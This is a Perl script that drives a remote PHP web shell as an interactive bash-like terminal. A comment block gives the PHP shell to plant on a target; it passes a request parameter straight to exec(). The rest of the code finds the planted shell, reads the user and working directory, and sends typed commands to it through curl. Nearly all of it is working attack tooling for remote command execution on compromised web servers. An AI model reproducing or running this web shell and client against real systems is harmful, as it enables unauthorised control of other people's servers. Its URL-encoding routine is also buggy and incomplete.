#!/opt/local/bin/perl

##########################################################
# This perl script interacts with a simple php shell.    #
# It is designed to act like a standard bash style shell #
# It does have some limitations and is a work in         #
# progress. Enjoy it!                                    #
##########################################################
# Todos:                    #   Limitations/Bugs:        #
# - URL encode EVERYTHING   #   - ctrl-c resets prompt   #
# - separate commands by ;  #     the first time but not #
#   and have them run       #     after that             #
#   separately (split?)     #   - Try not to make        #
# - Fix ctrl-C              #     commands too complex   #
# - remove global vars      #   - cd will bug out a bit  #
# - clean up code, always   #     if there are multiple  #
# - Base64 encode URL       #     in one command         #
##########################################################
# Here is the simple shell to upload to the target	 #
# <?php                                                  #
# 	 $cmd = $_REQUEST["shell"];                      #
#	 exec($cmd, $out);                               #
#	 foreach ($out as $line){                        #
#		 echo "$line <br>";                      #
#	 }                                               #
# ?>                                                     #
##########################################################

use warnings;
use strict;
our $pwd; #working directory variable 
our $loc; #web address of web shell
our $user; #user being used to run commands
$SIG{INT} = \&ctrlc; #defines control-C action

############################
# Simple function to strip #
# HTML tags <*> from input #
# parameter. Changes <br>s #
# to \n's as well for      #
# nicer output.            #
############################
sub StripTags{
	if (defined($_[1])){
		$_[0] =~ s/<br>/\n/g;
	}
	$_[0] =~ s/<\w+>|<\/\w+>//g;
}

############################
# A janky way to do cd...  #
# cd's to the previous dir #
# runs the full command    #
# and then figures out the #
# pwd (dir after command   #
#   HEY IT WORKS OKAY?!?   #
############################
sub cd{
	my $input = $_[0];
	$pwd = `curl -s $loc?shell=cd%20$pwd%3B$input%3Bpwd`;
	StripTags($pwd);
	$pwd =~ s/^\s+|\s+$//g;	
}

sub URLEncode{
        $_[0] =~ s/ /%20/g;
        $_[0] =~ s/!/%21/g;
        $_[0] =~ s/"/%22/g;
        $_[0] =~ s/#/%23/g;
        $_[0] =~ s/\$/%24/g;
        $_[0] =~ s/%/%25/g;
        $_[0] =~ s/&/%26/g;
        $_[0] =~ s/'/%27/g;
        $_[0] =~ s/\(/%28/g;
        $_[0] =~ s/\)/%29/g;
        $_[0] =~ s/\*/%2A/g;
        $_[0] =~ s/\+/%2B/g;
        $_[0] =~ s/,/%2C/g;
        $_[0] =~ s/-/%2D/g;
        $_[0] =~ s/\./%2E/g;
        $_[0] =~ s/\//%2F/g;
        $_[0] =~ s/0/%30/g;
        $_[0] =~ s/1/%31/g;
        $_[0] =~ s/2/%32/g;
        $_[0] =~ s/3/%33/g;
        $_[0] =~ s/4/%34/g;
        $_[0] =~ s/5/%35/g;
        $_[0] =~ s/6/%36/g;
        $_[0] =~ s/7/%37/g;
        $_[0] =~ s/8/%38/g;
        $_[0] =~ s/9/%39/g;
        $_[0] =~ s/:/%3A/g;
        $_[0] =~ s/;/%3B/g;
        $_[0] =~ s/</%3C/g;
        $_[0] =~ s/=/%3D/g;
        $_[0] =~ s/>/%3E/g;
        $_[0] =~ s/\?/%3F/g;
        $_[0] =~ s/@/%40/g;
        $_[0] =~ s/A/%41/g;
        $_[0] =~ s/B/%42/g;
        $_[0] =~ s/C/%43/g;
}

############################
# Defines ctrl-c behavior. #
# Kills curl and returns   #
# to the shell.            #
############################
sub ctrlc{
	`killall curl &>/dev/null`;
	print "\n";
	shell();
}

############################
# The main shell of the    #
# program. Runs commands   #
# with curl.               #
############################
sub shell{
	print "$pwd $user\$ "; #prints shell-like prompt
	chomp(my $input = <STDIN>);
	my @parts = split(';',$input);
	#next four lines URL Encode certain characters, to be replaced by URLEncode function
	$input =~ s/ /%20/g;
	$input =~ s/;/%3B/g;
	#$input =~ s/&/%26/g;
	#$input =~ s/>/%3E/g;
	if ($input eq "quit" || $input eq "exit"){
		exit;
	}
	foreach my $cmd (@parts){
		if ($cmd =~ m/cd \S+/){
			$cmd =~ s/ /%20/g;
			cd($cmd);
		}
	}

	chomp(my $output = `curl -s $loc?shell=cd%20$pwd%3B$input%202%3E%261`); #runs command and captures output
	#clean up output
	StripTags($output,1);
	chomp($output);
	$output =~ s/^\s+|\s+$//g;

	if ($output ne ""){
		print "$output\n";
	}
}

#prompt for, get, and check for existence of a web shell at the user spcified address.
print "Address of shell: ";
chomp($loc = <STDIN>);
if (`curl -s $loc?shell=echo%20index.php` =~ m/index\.php/){
	print "Shell found!\n";
}else{
	print "Shell not found!\n";
	exit;
}

#get current user and working dir for the prompt
$user = `curl -s $loc?shell=whoami`;
StripTags($user);
chomp($user);
$pwd = `curl -s $loc?shell=pwd`;
StripTags($pwd);
chomp($pwd);
$user =~ s/\s+$|^\s+//g;
$pwd =~ s/^\s+|\s+$//g;

#run the shell until "quit" or "exit"
while (1){
	shell();
}
